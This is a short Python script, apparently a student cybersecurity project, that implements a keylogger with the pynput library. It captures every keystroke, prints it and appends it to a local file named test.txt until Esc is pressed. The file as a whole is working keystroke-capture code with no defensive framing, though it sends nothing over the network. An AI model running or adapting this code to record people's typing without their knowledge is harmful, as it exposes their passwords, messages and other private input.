#keylogger using Python by Bharath Kumar
import pynput
from pynput.keyboard import Key,Listener
 #Cybersecurity Major Project
#empty list creation for storing pressed keys
f=[]

def on_press(key):
    f.append(key)
    write(f)
    print(key)

def write(var):
    with open("test.txt","a") as p:
        for i in var:
            n_var = str(i).replace("'","")
            p.write(n_var)
            p.write(" ")
        f.clear()    

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press,on_release=on_release) as l:
    l.join()
